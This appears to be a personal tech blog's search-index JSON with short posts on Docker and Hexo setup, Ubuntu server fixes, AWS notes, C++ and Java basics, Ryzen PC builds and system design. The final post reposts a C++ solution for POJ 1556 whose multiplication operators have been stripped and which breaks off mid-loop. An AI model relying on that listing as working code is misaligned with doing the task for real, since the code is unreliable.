{"pages":[],"posts":[{"title":"A scheme for running single docker-hexo server","text":"Start PHP service:1docker run --name phpfpm -d -v ~/www:/app php:5.6-fpmUse a pre-built hexo image:1docker run --name myhexo -v ~/blog:/root/blog -d sempr/hexo-alDon’t forget to make links between containers:1docker run -d --name mynginx -p 80:80 -p 443:443 --link phpfpm:phpfpm --link myhexo:myhexo -v ~/https.conf:/etc/nginx/conf.d/default.conf -v ~/1_im.semprathlon.net_bundle.crt:/etc/nginx/ssl/nginx.crt -v ~/2_im.semprathlon.net.key:/etc/nginx/ssl/nginx.key --volumes-from phpfpm nginx","link":"/posts/674f506d/"},{"title":"Insider view into HTML","text":"View Source vs. Inspect Element Not always the same. View Source for server-side HTML and Inspect Element for current state of DOM tree. Find standard compliant information for attributes Check browser compatibility A “div” generic container occupies 100% horizontally by default.","link":"/posts/bb56f728/"},{"title":"Machine-Learning-for-Game-TechStack","text":"Skymind.ai Keras blueberrymusic Deep Learning, Vol. 1: From Basics to Practice","link":"/posts/7d0c47ed/"},{"title":"Miscellanies about initializing an Ubuntu Server","text":"Having trouble with Windows SSH: Unprotected private key file1234567@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WARNING: UNPROTECTED PRIVATE KEY FILE! @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions for 'private' are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored.Load key &quot;private&quot;: bad permissions You can use icacls in windows instead of chmod to adjust file permission.12icacls .\\private.key /inheritance:ricacls .\\private.key /grant:r &quot;%username%&quot;:&quot;(R)&quot; Having trouble with SSH login: connection reset after idle for some time[Ineffective]1ssh -o TCPKeepAlive=true root@host.comFor long term use you should modify /etc/ssh/sshd_config as follows:12ClientAliveInterval 30ClientAliveCountMax 60 Error: Got permission denied while trying to connect to the Docker daemon socketFollow the just a few steps and you do not have to access docker images with superuser privileges.123sudo groupadd dockersudo gpasswd -a ${USER} dockersudo service docker restart Add a new sudoer1sudo usermod -aG sudo &lt;username&gt;","link":"/posts/4fa68e28/"},{"title":"Additions to Shadowsocks Server","text":"Prerequisite of chacha20: libsodium The service moved to V2ray.","link":"/posts/202415b4/"},{"title":"Learning Paths towards AWS Certification","text":"AWS IaaSAmazon S3scalable, durable object storage; decoupling storage from processing; parallelization; centralized, accessible and avoid moving between systems S3 bucket policy and IAM policy are different.Blocking the offending website IP traffic in security group may be trivial; makes “allows” but not “denies” AWS IaCCloudFormationAWS CloudFormation treats infrastructure / environment as code. AWS DBaaSRDSRDS Backups are automated, daily full backup; transaction logs are backed-up every 5 min. 7-35 days of retention. Manual DB snapshots have retention as long as possible. RDS can have up to 5 read replicas, within AZ, cross AZ or cross origin. Async replication. Reads are eventually consistent. Replicas can be promoted. It is possible to setup multi-AZ read replicas for Disaster Recovery(DR). DynamoDBDynamoDB is fully-managed scalable, fast and predictable performance NoSQL database. High availability and durability by 3 geographic replicas for each table. Eventually consistent or strong consistent choices. Secondary index for queries other than partition key and sort key.1RCU = 1 strongly consistent reading or 2 eventually consistent readings of 4KB/s1WCU = Writing of 1KB/sGlobal tables for replications SQS/SNS QueueAmazon SQS is “Fully managed message queuing service”.Standard SQS Queue can be asynchronous, not guaranteed the order, and at-least-once delivery. The other type of SQS Queue is first in first out and processed exactly once.SNS is kind of like SQS but SNS has topics and those topics can have subscribers. AWS SecurityIAMUsers or Groups are attached to Policies.Services assume Roles to gain access to other services, and roles have policies. AWS StorageEBS (Elastic Block Store) Volume is a network drive (i.e. not a physical drive) allowing to persist data. Has latency. Locked to specific AZ. (Need to migrate via I/O) Billed for all provisioned capacity in GBs and IOPS. Can increase capacity over time. EFS (Elastic Network File System) works in multi-AZ. Pay per use. Instance store is ephemeral (lost after termination) storage physically attached to the machine, best for intensive IOPS performance. Extrahttps://www.scnsoft.com/blog/spark-vs-hadoop-mapreducehttps://data-flair.training/blogs/apache-spark-rdd-vs-dataframe-vs-dataset/https://www.guru99.com/data-lake-vs-data-warehouse.htmlhttps://phoenixnap.com/kb/cassandra-vs-mongodbhttps://stackshare.io/stackups/amazon-sqs-vs-kafka","link":"/posts/115e2ac7/"},{"title":"Insight into advanced C++ OOP","text":"Source and HeaderThe reasons to separate are: To improve build times. Faster recompiles: If your implementation is split up into separate compilation units, you only need to recompile the ones that change when making edits. To link against code without having the source for the definitions. To avoid marking everything “inline”. Polymorphism in C++Compile time polymorphismFunction/Operator OverloadingRuntime polymorphismFunction overriding on the other hand occurs when a derived class has a definition for one of the member functions of the base class. To avoid ambiguity error when multiple inheritence. Virtual functions are functions that can be overridden in derived class with the same signature. Virtual functions enable run-time polymorphism in a inheritance hierarchy. If a function is ‘virtual’ in the base class, the most-derived class’s implementation of the function is called according to the actual type of the object referred to, regardless of the declared type of the pointer or reference. In non-virtual functions, the functions are called according to the type of reference or pointer. Static functions are class specific and may not be called on objects. Virtual functions are called according to the pointed or referred object. Virtual function has a VPTR that poccesses some memory. A member function can be virtual even if we have not uses virtual keyword with it. When a class has a virtual function, functions with same signature in all descendant classes automatically become virtual. We don’t need to use virtual keyword in declaration of fun() in B and C. They are anyways virtual. A base class function can be accessed with scope resolution operator even if the function is virtual.","link":"/posts/d9dccee6/"},{"title":"Cracking Java Interview","text":"A list of frequently asked Java questions Overriding vs overloading Overriding happens at subclass while overloading happens in the same class. Also, overriding is a runtime activity while overloading is resolved at compile time. Difference between Hashtable and Hashmap, ArrayList and Vector Synchronized or not. Thread-safe and synchronization","link":"/posts/e6d6bf01/"},{"title":"Development Environment Management","text":"Building environment setup can be very subtle and in-depth. Even the same python 3.6 has a different dependent static library on Linux than on Mac. Node brew install nvmnvm lsnvm install 11nvm use 11 Java /usr/libexec/java_home [-V] [-v 1.8] PythonMac built-in python wasn’t fully workable. brew install pyenvpyenv versionspyenv install 3.6.10pyenv local/global 3.6.10","link":"/posts/85d30cd2/"},{"title":"How to build a minimized docker image for Hexo","text":"To start with, it is not easy for greenhands to write out an appropriate buildfile for hexo in docker.As is suggested, Alpine is a minimized Linux environment designated for docker images, which appears to be tiny in size.Yet it is tough to upgrade node and npm if the pulled version of alpine is outmoded, so take a look when choosing the right origin of the mirror. The version of localization in China:123456789101112131415161718192021222324252627FROM daocloud.io/library/alpine:3.6MAINTAINER CitruXonve, silveritdean@gmail.comRUN \\ # In China, switch to USTC mirror sources for better efficiancy sed -i 's/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g' /etc/apk/repositories &amp;&amp; \\ apk update &amp;&amp; apk upgrade &amp;&amp; apk add --update wget curl bash nodejs-npm &amp;&amp; \\ # Resolve error: could not get uid/gid 'nobody' npm config set unsafe-perm true &amp;&amp; \\ # In China, use cnpm for better efficiancy npm install -g cnpm --registry=https://registry.npm.taobao.orgWORKDIR /rootRUN \\ cnpm install hexo-cli -g &amp;&amp; \\ mkdir blog &amp;&amp; cd blog &amp;&amp; \\ # install hexo cnpm install hexo-cli -g &amp;&amp; \\ hexo init &amp;&amp; cnpm install WORKDIR /root/blog/EXPOSE 4000CMD [&quot;/usr/bin/hexo&quot;, &quot;s&quot;]Otherwise:12345678910111213141516171819202122FROM daocloud.io/library/alpine:3.6MAINTAINER CitruXonve, silveritdean@gmail.comRUN \\ apk update &amp;&amp; apk upgrade &amp;&amp; apk add --update wget curl bash nodejs-npm &amp;&amp; \\ # Resolve error: could not get uid/gid 'nobody' npm config set unsafe-perm trueWORKDIR /rootRUN \\ mkdir blog &amp;&amp; cd blog &amp;&amp; \\ # install hexo npm install hexo-cli -g &amp;&amp; \\ hexo init &amp;&amp; npm install WORKDIR /root/blog/EXPOSE 4000CMD [&quot;/usr/bin/hexo&quot;, &quot;s&quot;]1docker build -t crxon/alpine-hexo -f hexo-in-docker-alpine .Run after build:1docker run --name myhexo -p 4000:4000 -v ~/blog:/root/blog -d crxon/alpine-hexo:releaseDebug:1docker run --rm --name myhexo -p 4000:4000 -v ~/blog:/root/blog -it crxon/alpine-hexo:debug /bin/bash","link":"/posts/9993cf47/"},{"title":"Good to know about Bootstrap","text":"Container Whatever is enclosed inside &lt;div class=&quot;container&quot;&gt;&lt;/div&gt; will be restricted to the same width as the rest of the Web page. Material Design Indeed, If you have interest where I found this colors you can visit www.android.com and then look up their documentation for material design and there, they have suggestions for how colors can be used in your Android application but the same thing applies even to a website. Column classes col, col-x, col-auto col-xx-x order-xx-first/last offset-xx-x Button class btn-block","link":"/posts/b7df6c60/"},{"title":"Good to know about ECMAScript6","text":"Variation hoisting Global or local variable? var/const/let/[none] Arrow function this reference","link":"/posts/ed63e82e/"},{"title":"Good to know about NoSQL","text":"NoSQL is non-relational ACID-compliant (only just recently with MongoDB) Atomic/Atomacity: A change will not be saved but rolled back unless the entire transaction is completed. Consistency: No intermediate state from one valid state to another. Always valid states. Isolation: The effect of more than one concurrent transactions is the same as if they happen in sequence. Durability: The data is there no matter whether database is shutdown, failures or crashes.","link":"/posts/5dcb825e/"},{"title":"Good to know about ReactJS","text":"Declarative Component-based encapsulate behaviors into small units called Components Components are made of elements. Components enable us to break down the entire UI in to smaller reusable pieces. can have private states to control. Only class components can store states. Component Methods Component State and Lifecycle Element smallest building blocks is elements. Basic structure for a component 123456789101112131415import React, { Component } from 'react';class Menu extends Component { constructor(props) { super(props); // Need to supply this props to the super class } render(){ return( // the view for this component ); }}export default Menu;//need to import this component for wherever we use Every parameter pass to the component is under props. If one component export the default one, there is no need to enclose import component name with braces, otherwise error occurs. JSX: wrapped React Component expression Handling events like handling DOM elements","link":"/posts/34fdc01b/"},{"title":"Hello Hexo","text":"Welcome to Hexo! This is the very first post after the blog being rebuilt based on Hexo. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/posts/a1751c09/"},{"title":"Miscellanies about Hexo deployment with purification","text":"Git switch remote origin 1234$ git remote rm origin$ git remote add origin &lt;repository&gt;$ git config master.remote origin$ git config master.merge refs/heads/master Git change the commit author But the SHA1 code changes after revision. Git add submodule reference 1git submodule add &lt;repository&lt;path&gt; check .gitmodules for details. Git clone submodule references Git remove submodule reference 123git submodule deinit &lt;path_to_submodule&gt;git rm [-r] [--cached] &lt;path_to_submodule&gt;git commit -m &quot;Removed submodule&quot; rm -rf .git/modules/&lt;path_to_submodule&gt; Git submodule HEAD detached Update .gitmodule and specify the branch of submodule to track. Then reload: 12git submodule syncgit submodule update --init --recursive --remote Or re-add the submodule: 12git submodule add -b &lt;branch&lt;repository[&lt;submodule-path&gt;]git submodule update --remote Hexo theme spectre theme unexpected token error Hexo math not working Git – Resolve Merge Conflicts 12git checkout --ours PATH/FILE # accepting base version onlygit checkout --theirs PATH/FILE # accepting incoming version only How to use GitHub badges to stop feeling like a noob Katex can work more efficiently than Mathjax","link":"/posts/a54d5a40/"},{"title":"Insights into DNS","text":"DNS cannot mapping to subfolders DNS can only map to an host/IP address, but not path / port. What you ask for requires URL forwarding/redirecting, and is not about DNS records. You will need a web server to redirect by HTTP 301.","link":"/posts/81193b39/"},{"title":"Domestic IT corporation technical interview examples","text":"https://juejin.im/entry/5893e8f2128fe10065477d08 https://www.cnblogs.com/wenbochang/p/8808072.html https://blog.csdn.net/mxsgoden/article/details/8821936 https://www.nowcoder.com/discuss/77835?type=2&amp;order=1&amp;pos=913&amp;page=1 https://blog.csdn.net/weixin_33759269/article/details/93054344 https://blog.csdn.net/qq_35264464/article/details/80050005 https://www.nowcoder.com/discuss/169881 http://blog.sina.com.cn/s/blog_6d932f2a0101jjkl.html https://www.nowcoder.com/discuss/273271 https://www.nowcoder.com/discuss/161537 https://www.nowcoder.com/discuss/172152?type=0&amp;order=0&amp;pos=5&amp;page=4","link":"/posts/a1d12a45/"},{"title":"JDK for macOS","text":"You need the following to distinguish between built-in and user installed versions of JDK. /usr/libexec/java_home -verbose","link":"/posts/76342b91/"},{"title":"Kubernetes (K8s) Containerization at an Entry Level","text":"What?A container is an executable unit of software in which application code is packaged (encapsulated), along with its libraries and dependencies, in common ways so that it can be run anywhere, whetheron a desktop, on-premises, or in the cloud. A container include a guest OS; instead it leverages host OS.Compared to virtual machines, containers virtualize the operating system rather than the infrastructure.The clear benefit of containers is that you do not have to run a dedicated operating system instance for each virtual environment. Instead, one operating system is virtualized across all the containers. To do this, containers take advantage of a form of operating system virtualization. Benefits: isolates processes; controls resources allocated to them; small, fast portable Use cases Containers are small and lightweight, which makes them a good match for microservice architectures where applications are constructed of many loosely coupled and independently deployable smaller services. The combination of a microservices architecture and containers is a common foundation for many teams that embrace DevOps as the way they build, ship, and run software. OrchestrationContainer orchestration manages the lifecycle of containers especially in large dynamic environments.Kubernetes is a portable, extensible, open-source platform for managing containerized workloads and services that facilitates both declarative configuration and automation.In contrast to PaaS, Kubernetes provides a flexible model that maintains choice for users.No CI/CD pipelines; no logging, monitoring or alerting; no built-in databases, microservices or other services. A deployment of Kubernetes is called a “cluster.” The control plane consists of several components. First is the Kubernetes API server, which exposes the Kubernetes API. All communication in the cluster utilizes this API. Next is “etcd,” a highly available key value store that contains all the cluster data, deployment configuration and truth of states The Kubernetes scheduler assigns newly created Pods to nodes. The Kubernetes controller manager runs all the controller processes Nodes are the worker machines (virtual/physical machines) in a Kubernetes cluster. Each node is managed by the control plane and is able to run Pods. Nodes are not created by Kubernetes itself, but rather by the cloud provider. Kubernetes objects are persistent entities in Kubernetes. (Can be Pods, namespaces, Deployments, ConfigMaps, and volumes) Namespaces provide a convenient way to virtualize a physical cluster. With namespaces, you can make one cluster appear to be several distinct clusters. This is useful when several teams want to share a cluster, such as for cost-saving purposes, Pod is the simplest unit that you deploy in Kubernetes. Represents a process or a single instance of running app in cluster. A Pod wraps a single container or encapsulate multiple tightly coupled containers. ReplicaSet is a group of identical Pods that are running. ReplicaSets are the object used to do horizontally scaling by running replicas of a Pod. helps scale applications to meet increasing demand. Maintains desired state. True to this loose-coupling idea, the ReplicaSet does not own any of the pods; instead it uses the pod labels Deployment is an object that provides updates for both Pods and ReplicaSets. Deployments run multiple replicas of an application by creating ReplicaSets and offering additional management capabilities on top of those ReplicaSets. suitable for stateless applications. Deployments are more robust and provide additional objects, rolling updates than replicasets.","link":"/posts/92383761/"},{"title":"macos-disk-cleanup","text":"Basics: Purgeable space is not unused space.Purgeable space is logically unoccupied at the scope of macOS System, but physically not. Idiot apps like Xcode would refuse to install, though the “available” space is fairly enough, given that purgeable space included. Use df -h to query for unused disk space physically. Purgeable space can be released manually by making local snapshots thinner. tmutil thinlocalsnapshots / 10000000000 4 Shrink TimeMachine backups. Remove local Photo LibraryStop icloud photo syncing. Remove unused SimulatorsThey can be downloaded again from Xcode when in need. xcrun simctl delete unavailable/all Remove unused Docker local image","link":"/posts/158914ad/"},{"title":"macos-env-conf-revision","text":"","link":"/posts/9d23339/"},{"title":"Refinement on MapReduce","text":"https://databricks.com/blog/2015/06/22/understanding-your-spark-application-through-visualization.html https://spark.apache.org/docs/latest/cluster-overview.html https://mapr.com/blog/getting-started-spark-web-ui/ https://michalsenkyr.github.io/2018/01/spark-performance https://dzone.com/articles/my-tryst-with-elasticsearch","link":"/posts/ac261aea/"},{"title":"Miscellanies about React Native","text":"If /android or /ios is missing under project volume: 12react-native upgrade # optionalreact-native eject react-native run-ios: xcrun: error: unable to find utility “instruments”, not a developer tool or in PATHerror Command failed: xcrun instruments -sxcrun: error: unable to find utility “instruments”, not a developer tool or in PATH https://stackoverflow.com/questions/42506068/how-can-i-regenerate-ios-folder-in-react-native-project","link":"/posts/5bbe6a52/"},{"title":"Miscellanies about initializing an Ubuntu Server (II)","text":"Error: Permission denied … when running Docker (perviously seen)Better solution than before:123sudo groupadd dockersudo usermod -aG docker $USERsudo service docker restart[UPDATE]Looks like it is also required to logging out and back so that the group membership change takes effect (how?): 1su -s ${USER} And this is to check for group membership:1getent group groupname | awk -F: '{print $4}' Potential issue when Docker for Ubuntu is installed and managed by SnapEither systemd or systemctl won’t be able to locate or control Docker, which would occur when Docker is pre-installed with Ubuntu Server. Use snap commands instead:12sudo snap services dockersudo snap restart docker Local Build PreparationThis is likely to be a cure-all:1sudo apt install -y build-essential","link":"/posts/28045272/"},{"title":"Rational of OS and multi-threading and database performance","text":"Kernel state and user state Memory management and address conversion Thread-pool Concurrency ACID (Atomicity, Consistency, Isolation, Durability) is a set of properties of database transactions","link":"/posts/75f3b9a8/"},{"title":"Advanced Python Programming","text":"What are the method(s) that iterator object must implement? __iter__() and __next__() If a function contains at least one yield statement, it becomes a generator function. In Python, there is a built-in function property() that returns a property object. The property object has which of the following methods? getter(), setter() and delete() zip produces an iterator which can only be iterated once. Once you have iterated it, it’s exhausted. Where to use closure We must have a nested function (function inside a function). The nested function must refer to a value defined in the enclosing function. The enclosing function must return the nested function.","link":"/posts/63f46c53/"},{"title":"Reform on course taking","text":"Withdraw a course if workload is too heavy. Auditory sense stimulates comprehension when learning for first time. Multimedia records and replays are required. Paper-based books and notes may fit for efficient reviewing. Notes on screens are not yet quite suitable for looking over. Textbooks appear to be loquacious at first glance, but include meaningful extensions.","link":"/posts/aa43b48/"},{"title":"ryzen-build-improvement","text":"Proposal 1: A NAS build is not exactly NAS-compliantAthlon 200GE doesn’t support ECC, though literally all Ryzen CPUs do. B450 supports ECC with some limitations, accordint to the example user manual: AMD Ryzen series CPUs (Pinnacle Ridge) support DDR4 3466+(OC)/3200(OC)/2933/2667/2400/2133 ECC &amp; nonECC, un-buffered memory* AMD Ryzen series CPUs (Summit Ridge) support DDR4 3466+(OC)/3200(OC)/2933(OC)/2667/2400/2133 ECC &amp; non-ECC, un-buffered memory* AMD Ryzen series CPUs (Raven Ridge) support DDR4 3466+(OC)/3200(OC)/2933(OC)/2667/2400/2133 non-ECC, un-buffered memory* For Ryzen Series CPUs (Raven Ridge), ECC is only supported with PRO CPUs. Part of CPU Support List: Socket Family Model AM4 Ryzen 3 PRO 3200G (YD320BC5M4MFH) 65W Picasso 3.6GHz 2MB B1 P3.30 AM4 Ryzen 3 PRO 3200GE (YD320BC6M4MFH) 35W Picasso 3.3GHz 2MB B1 P3.30 AM4 Ryzen 3 3200G (YD3200C5M4MFH) 65W Picasso 3.6GHz 2MB B1 P3.30 AM4 Ryzen 3 3200GE (YD3200C6M4MFH) 35W Picasso 3.3GHz 2MB B1 P3.30 … … … AM4 Ryzen 3 PRO 2200G (YD220BC5M4MFB) 65W Raven Ridge 3.5GHz 2MB B0 All AM4 Ryzen 3 PRO 2200GE (YD220BC6M4MFB) 35W Raven Ridge 3.2GHz 2MB B0 All AM4 Ryzen 3 2200G (YD2200C5M4MFB) 65W Raven Ridge 3.5GHz 2MB B0 All AM4 Ryzen 3 2200GE (YD2200C6M4MFB) 35W Raven Ridge 3.2GHz 2MB B0 All AM4 Ryzen 3 PRO 1300 (YD130BBBM4KAE) 65W Summit Ridge 3.4GHz 2MB B1 All … … … AM4 Athlon 3000G (YD3000C6M2OFH) 35W Picasso 3.5GHz 1MB B1 P3.50 … … … AM4 Athlon Athlon PRO 200GE (YD200BC6M2OFB) 35W Raven Ridge 3.2GHz 1MB B0 All AM4 Athlon Athlon 200GE (YD200GC6M2OFB) 35W Raven Ridge 3.2GHz 1MB B0 All To support ECC and avoid the use of a dedicated GPU at the same time, PRO 2200G/GE is proposed as the lowest-end eligible CPU for refreshed NAS build. SSD cache is optional for RAM less than 32GB. Cheap refurbished NICs can be actually kinda model many years ago. 40mm quiet cooling fan replacement needed. Proposal 2: MSI RMA requestExchange done. Proposal 3: Ultimate casual video editing rig, unlimited budgetWait for annual refresh of Threadripper. TRX40 should continue to receive support. 1200W PSU for dual-GPU. ASUS ROG PSU can be installed upside-down. Build samples: TensorBook Deep Learning Workstation","link":"/posts/735e7650/"},{"title":"How to quickly solve Ryzen Heat Issue","text":"Do not mistakenly accuse the cooler for the most common overheating issue under Windows10. The cause is actually the unreasonable Windows power management plan. “Performance Mode” actually means “Balanced Mode” and vice versa.","link":"/posts/f5daccde/"},{"title":"The plan to equip Ryzen","text":"Division 1: A Baseline NAS Component Product Name Cost Source Status HDD Beracuda 2TB JD Already owned CPU AMD Athlon 200GE with Radeon Vega Graphics ¥239 Taobao New Mobo ASRock B450 Gaming-ITX/ac (AM4 Socket) ¥853 JD New RAM MAXSUN Q3 DDR4 2666 8G ¥179 Taobao New PSU FSP MS450 450W SFX ¥439 JD New Case CyberPowerPC Syber CSCCO100 Orange Mini ITX Gaming Case $34.99 Gamestop New Heat sink New Subtotal ~$281.5 Division 2: A “Rig” for Computing &amp; RenderingStage 1 Component Product Name Cost Source Status Graphics Sapphire Radeon NITRO+ RX 590 8GB GDDR5 PCI-E $215.99 Amazon Already owned PSU Thermaltake Smart White RGB 500W 80+ White 12V ATX - PS-SPR-0500NHFAWU-1 $49.99 Walmart Already owned RAM G.Skill TridentZ RGB Series 16GB (2 x 8GB) 288-Pin SDRAM DDR4 3200 (PC4 25600) F4-3200C14D-16GTZR $164.54 Amazon New Case BitFenix Prodigy M $94.99 Amazon New Mobo MSI B450M MORTAR ¥618.99 JD New SSD SAMSUNG 500GB M.2(NVMe) 970 EVO MZ-V7E500BW ¥598.99 JD New CPU AMD RYZEN 7 3700X w/ Wraith Prism Cooler $324.99 Amazon New Subtotal ~$1026 Notes: Some may suggest MSI B450M MORTAR TITANIUM / MAX, which turn out to be almost the same except in another color / capable of higher RAM frequency. The stylish inverted BitFenix Prodigy M case has some unique air flow issues. Stage 2 Component Product Name Cost Source Status RAM The same (2 x 8GB) $154.99 Amazon New Graphics Starting from GTX1660 Super, RX 5700, RTX 2060, … PSU Thermaltake Toughpower Grand RGB 750W 80+ Gold MB 12V RGB $112.85 Amazon New Water Cooling JONSBO SHADOW 240 ¥399 JD New Fan CoolerMaster MasterFan MF120R ARGB x3 bundle w/ controller ¥349 JD New Notes: Entry-level AIO water coolers are not recommended, which can’t even beat tower fan coolers. Video Editing PC BuildingDeep Learning Rig Building","link":"/posts/44b662bb/"},{"title":"Replacing system-wide &#96;nodejs&#96; by another version managed by &#96;nvm&#96;","text":"Some legacy codes are not compatible with latest nodejs. nvm helps with this situation to provide older stable version. Uninstall system-wide nodejs and install nvm via package management. Config fish-shell: 123456function nvm bass source (brew --prefix nvm)/nvm.sh --no-use ';' nvm $argvendset -x NVM_DIR ~/.nvmnvm use default --silent Take effect immediately: source ~/.config/fish/config.fish An extension to fish-shell is bass. Bass makes it easy to use utilities written for Bash in fish shell. An extension to homebrew is cask.","link":"/posts/68043a0e/"},{"title":"System Design Memorandum on Priority Topics","text":"Cache is to reduce latency in the system.Cache prefers immutable or static data.Cache can be stale when not updated. Ask, do we care that much?Write Policy: Write through cache vs write back cacheEviction policy: LRU, FIFO, LFU How to sync between Cache and DB?It is more complicated when syncing Cache replicas &amp; DB replicas and maintain consistency &amp; high throughput. Get() follows cache-aside strategy ; update() follows write through strategy; delete() request both operations into caches and DBs; upon DB changed, trigger some asynchronized threads to wait a certain while and notify the cache again to evict stale data that happened to be brought by concurrent reading from DB into cache (proven and incorporated by Facebook) Hashing function basically transforms arbitrary pieces of data into fixed size values (typ. Integers)Consistent hashingConsistent hashing maximizes the cache hits when adding and removing cache nodes; minimizes key re-distribution; mitigate hotkey problem Clockwise walk logic: Consider (partition a circle) placing nodes on a imaginary circle and distribute evenly in the clockwise direction. Hashing function can put them. When determining which node a request should go to, walk from the key location on the cycle, in that direction and encounter the nearest server. When adding or removing nodes, place/remove nodes and maintain the locations of others. But the partitioning or key distribution is still non-uniform; will use virtual nodes or replicas By introducing virtual nodes pointing to real ndoes, each server is represented by multiple virtual nodes and responsible for multiple regions. Server of higher capacity is assigned to more virtual nodes. As they grows, the distribution of keys becomes more balanced and standard deviation gets smaller. Load balancerserver-selection strategyRound-robin, random selection, performance-based selection Round-robin: client requests are routed to available servers on a cyclical basis. Round robin server load balancing works best when servers have roughly identical computing capabilities and storage capacity. Hot spot when sharding key or hashing function are suboptimal, or the workload is naturally skewed Strong consistency - ACID transactionsEventual consistencyReads might return stale data;Only guarantee the state of DB will eventually reflect writes within a certain period. Leader election - consensus algorithm often implemented by 3rd-party serviceZooKeeper is a strongly consistent, highly available key-value store. Often used to store important configuration or leader election Rate limiting - by what? Ips? Users? Regions?Apache Kafka is a distributed messaging system created by LinkedIn. Very useful when using the streaming paradigm as opposed to polling.","link":"/posts/288a795e/"},{"title":"UX research startup","text":"Why IA Matters for UX — A Brief History of Information Architecture Information architecture (IA) is essentially a mental wayfinding system.","link":"/posts/f3ff0bfc/"},{"title":"Various React components","text":"Stateless components - purely functional No need to implement constructor then.","link":"/posts/e24b8397/"},{"title":"Hello world!","text":"Welcome to WordPress. This is my first post, start blogging!","link":"/posts/1b851995/"},{"title":"A guide to guests","text":"My Email:Semprathlon@163.com My microblog:http://weibo.com/644482701 My github repositories:https://github.com/semprathlon/ My code storages:http://blog.csdn.net/aksdrxzd My previous blog:http://hi.baidu.com/aksdrxzd01","link":"/posts/e8c5098e/"},{"title":"Pixiv推荐","text":"","link":"/posts/aa6b4fe2/"},{"title":"Guide","text":"","link":"/posts/b5fe831/"},{"title":"【南街甜糖】的曲目单","text":"[nm][/nm]","link":"/posts/1f5ffece/"},{"title":"My Git Note","text":"Note! 益rz Unix的哲学是“没有消息就是好消息” 基本操作-新增文件：git add {readme.txt} -提交并注释：git commit -m “{wrote a readme file}” -仓库初始化：git init -取得仓库状态：git status 分支管理参考指针或链表模型 -新建分支并切换：git checkout [-b] {dev} -查看分支：git branch -切换分支：git checkout [master] -合并分支：git merge -删除分支：git branch -d","link":"/posts/dc39e1d2/"},{"title":"觉得读书无用或读书少怎么办 - 张佳玮写字的地方 - 知乎专栏","text":"觉得读书无用或读书少怎么办 - 张佳玮写字的地方 - 知乎专栏. 整理了一下思路","link":"/posts/14bbddee/"},{"title":"POJ 1556 The Doors（线段交+最短路） - kuangbin - 博客园","text":"POJ 1556 The Doors（线段交+最短路） - kuangbin - 博客园. [code lang=”cpp”]/** Author : kuangbin Email : kuangbin2009@126.com Last modified : 2013-07-14 10:47 Filename : POJ1556TheDoors.cpp Description : */ #include &lt;iostream&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;algorithm&gt; #include &lt;queue&gt; #include &lt;map&gt; #include &lt;vector&gt; #include &lt;set&gt; #include &lt;string&gt; #include &lt;math.h&gt; using namespace std; const double eps = 1e-8;int sgn(double x){ if(fabs(x) &lt; eps)return 0; if(x &lt; 0) return -1; else return 1;}struct Point{ double x,y; Point(){} Point(double _x,double _y) { x = _x;y = _y; } Point operator -(const Point &amp;b)const { return Point(x - b.x,y - b.y); } double operator ^(const Point &amp;b)const { return xb.y - yb.x; } double operator (const Point &amp;b)const { return xb.x + yb.y; }};struct Line{ Point s,e; Line(){} Line(Point _s,Point _e) { s = _s;e = _e; }};//判断线段相交bool inter(Line l1,Line l2){ return max(l1.s.x,l1.e.x) &gt;= min(l2.s.x,l2.e.x) &amp;&amp; max(l2.s.x,l2.e.x) &gt;= min(l1.s.x,l1.e.x) &amp;&amp; max(l1.s.y,l1.e.y) &gt;= min(l2.s.y,l2.e.y) &amp;&amp; max(l2.s.y,l2.e.y) &gt;= min(l1.s.y,l1.e.y) &amp;&amp; sgn((l2.s-l1.s)^(l1.e-l1.s))sgn((l2.e-l1.s)^(l1.e-l1.s)) &lt;= 0 &amp;&amp; sgn((l1.s-l2.s)^(l2.e-l2.s))sgn((l1.e-l2.s)^(l2.e-l2.s)) &lt;= 0;}double dist(Point a,Point b){ return sqrt((b-a)(b-a));}const int MAXN = 100;Line line[MAXN];double dis[MAXN][MAXN];const double INF = 1e20;int main(){ //freopen(&quot;in.txt&quot;,&quot;r&quot;,stdin); //freopen(&quot;out.txt&quot;,&quot;w&quot;,stdout); int n; double x,y1,y2,y3,y4; while(scanf(&quot;%d&quot;,&amp;n) == 1) { if(n == -1) break; for(int i = 1;i &lt;= n;i++) { scanf(&quot;%lf%lf%lf%lf%lf&quot;,&amp;x,&amp;y1,&amp;y2,&amp;y3,&amp;y4); line[2i-1] = Line(Point(x,y1),Point(x,y2)); line[2i] = Line(Point(x,y3),Point(x,y4)); } for(int i = 0;i &lt;= 4n+1;i++) for(int j = 0;j &lt;= 4n+1;j++) { if(i == j)dis[i][j] = 0; else dis[i][j] = INF; } for(int i = 1;i &lt;= 4n;i++) { int lid = (i+3)/4; bool flag = true; Point tmp; if(i&amp;1)tmp = line[(i+1)/2].s; else tmp = line[(i+1)/2].e; for(int j = 1;j &lt; lid;j++) if(inter(line[2j-1],Line(Point(0,5),tmp)) == false &amp;&amp; inter(line[2j],Line(Point(0,5),tmp)) == false) flag = false; if(flag)dis[0][i] =dis[i][0] = dist(Point(0,5),tmp); flag = true; for(int j = lid+1;j &lt;= n;j++) if(inter(line[2j-1],Line(Point(10,5),tmp)) == false &amp;&amp; inter(line[2j],Line(Point(10,5),tmp)) == false) flag = false; if(flag)dis[i][4n+1] =dis[4n+1][i] = dist(Point(10,5),tmp); } for(int i = 1;i &lt;= 4n;i++) for(int j = i+1;j &lt;=4n;j++) { int lid1 = (i+3)/4; int lid2 = (j+3)/4; bool flag = true; Point p1,p2; if(i&amp;1)p1 = line[(i+1)/2].s; else p1 = line[(i+1)/2].e; if(j&amp;1)p2 = line[(j+1)/2].s; else p2 = line[(j+1)/2].e; for(int k = lid1+1;k &lt; lid2;k++) if(inter(line[2k-1],Line(p1,p2)) == false &amp;&amp; inter(line[2k],Line(p1,p2)) == false) flag = false; if(flag) dis[i][j] = dis[j][i] = dist(p1,p2); } bool flag = true; for(int i = 